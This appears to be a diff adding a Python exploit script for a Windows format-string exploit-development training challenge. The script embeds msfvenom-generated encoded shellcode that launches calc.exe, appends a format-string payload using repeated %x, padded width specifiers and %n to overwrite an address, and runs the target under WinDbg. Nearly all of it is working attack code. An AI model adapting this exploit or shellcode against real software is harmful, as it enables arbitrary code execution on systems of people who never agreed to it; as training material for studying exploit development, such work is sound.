@@ -1,0 +1,119 @@
+import os
+import win32process
+import win32event
+import win32api
+
+challenge_path = "C:\\Users\\kali\\Desktop\\ExpDev_Traning\\formatstring_challenge\\Challenge.exe"
+windbg_path = "C:\\Users\\kali\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"
+
+
+def start_program_suspended(command):
+
+    # Create the process in a suspended state
+    startup_info = win32process.STARTUPINFO()
+    process_info = win32process.CreateProcess(
+        None,
+        " ".join(command),
+        None,
+        None,
+        False,
+        win32process.CREATE_SUSPENDED,
+        None,
+        None,
+        startup_info
+    )
+    return process_info
+
+def attach_windbg(pid):
+
+    if pid:
+        # command to attach windbg to the process
+        windbg_command = f"{windbg_path} -p {pid}"
+
+        # Start Windbg and attach it to the process
+        os.system(windbg_command)
+    else:
+        print("\nProcess terminated too quickly. Restarting the process.")
+
+def resume_process(process_info):
+    # Resume the suspended process
+    win32process.ResumeThread(process_info[1])
+
+
+def sploit():
+
+    # msfvenom -p windows/exec cmd=calc.exe  -b "\x00\x09\x20\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f" -f py  -v shellcode
+    shellcode =  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x81\xC4\x3C\xF6\xFF\xFF" # add esp, 2500
+    shellcode += "\x54\x5d\xd9\xec\xd9\x75\xf4\x59\x49\x49\x49"
+    shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43"
+    shellcode += "\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30"
+    shellcode += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
+    shellcode += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
+    shellcode += "\x42\x75\x4a\x49\x69\x6c\x48\x68\x4f\x72\x55"
+    shellcode += "\x50\x65\x50\x35\x50\x63\x50\x6c\x49\x4b\x55"
+    shellcode += "\x44\x71\x39\x50\x45\x34\x4e\x6b\x76\x30\x76"
+    shellcode += "\x50\x6c\x4b\x63\x62\x64\x4c\x4e\x6b\x33\x62"
+    shellcode += "\x65\x44\x6e\x6b\x31\x62\x64\x68\x74\x4f\x6d"
+    shellcode += "\x67\x53\x7a\x46\x46\x35\x61\x69\x6f\x4c\x6c"
+    shellcode += "\x35\x6c\x63\x51\x73\x4c\x54\x42\x64\x6c\x45"
+    shellcode += "\x70\x4b\x71\x38\x4f\x74\x4d\x65\x51\x6f\x37"
+    shellcode += "\x58\x62\x69\x62\x63\x62\x42\x77\x6e\x6b\x56"
+    shellcode += "\x32\x62\x30\x6c\x4b\x42\x6a\x47\x4c\x4c\x4b"
+    shellcode += "\x42\x6c\x62\x31\x52\x58\x49\x73\x77\x38\x37"
+    shellcode += "\x71\x6b\x61\x42\x71\x4c\x4b\x43\x69\x75\x70"
+    shellcode += "\x77\x71\x48\x53\x4e\x6b\x47\x39\x54\x58\x7a"
+    shellcode += "\x43\x37\x4a\x37\x39\x4e\x6b\x66\x54\x6e\x6b"
+    shellcode += "\x77\x71\x4a\x76\x30\x31\x69\x6f\x6e\x4c\x4a"
+    shellcode += "\x61\x68\x4f\x34\x4d\x53\x31\x4a\x67\x77\x48"
+    shellcode += "\x59\x70\x32\x55\x6b\x46\x44\x43\x71\x6d\x4b"
+    shellcode += "\x48\x57\x4b\x53\x4d\x34\x64\x34\x35\x78\x64"
+    shellcode += "\x76\x38\x4c\x4b\x72\x78\x46\x44\x75\x51\x6b"
+    shellcode += "\x63\x53\x56\x6c\x4b\x56\x6c\x42\x6b\x6c\x4b"
+    shellcode += "\x32\x78\x75\x4c\x33\x31\x7a\x73\x6e\x6b\x76"
+    shellcode += "\x64\x6c\x4b\x57\x71\x68\x50\x6f\x79\x62\x64"
+    shellcode += "\x44\x64\x57\x54\x73\x6b\x43\x6b\x73\x51\x52"
+    shellcode += "\x79\x63\x6a\x70\x51\x6b\x4f\x4b\x50\x31\x4f"
+    shellcode += "\x43\x6f\x70\x5a\x6e\x6b\x42\x32\x58\x6b\x4c"
+    shellcode += "\x4d\x61\x4d\x70\x6a\x67\x71\x4e\x6d\x6b\x35"
+    shellcode += "\x6c\x72\x45\x50\x55\x50\x57\x70\x46\x30\x70"
+    shellcode += "\x68\x35\x61\x6e\x6b\x30\x6f\x6f\x77\x39\x6f"
+    shellcode += "\x58\x55\x6f\x4b\x4c\x30\x6d\x65\x39\x32\x76"
+    shellcode += "\x36\x35\x38\x4e\x46\x6e\x75\x4f\x4d\x4f\x6d"
+    shellcode += "\x49\x6f\x48\x55\x75\x6c\x43\x36\x73\x4c\x67"
+    shellcode += "\x7a\x4f\x70\x4b\x4b\x4d\x30\x34\x35\x73\x35"
+    shellcode += "\x6f\x4b\x77\x37\x42\x33\x54\x32\x70\x6f\x71"
+    shellcode += "\x7a\x65\x50\x71\x43\x69\x6f\x38\x55\x35\x33"
+    shellcode += "\x50\x61\x72\x4c\x52\x43\x74\x6e\x50\x65\x33"
+    shellcode += "\x48\x52\x45\x45\x50\x41\x41\x90"
+
+    print("Shellcode Size: %d" % len(shellcode))
+
+    # the 0x20 is a bad char for testing purpuse I added \x21 later I modified to \x20
+    shellcode +=  "\x41" * (300 - len(shellcode))
+    sploit = '%x'*244 + '%.343506x' * 3 + '%.341089x' + '%n'+ "\x21\xf7\x14\x00"
+
+    shellcode += sploit
+
+    command = [challenge_path] + [shellcode]
+
+    # Start the program in a suspended state
+    process_info = start_program_suspended(command)
+
+    # Get the process ID (PID)
+    pid = process_info[2]
+
+    # Attach windbg to the suspended process
+    attach_windbg(pid)
+
+    # Resume the process
+    resume_process(process_info)
+
+    # Wait for the process to complete
+    win32event.WaitForSingleObject(process_info[0],win32event.INFINITE)
+
+    # Close handles
+    win32api.CloseHandle(process_info[0])
+    win32api.CloseHandle(process_info[1])
+
+if __name__ == '__main__':
+    sploit()
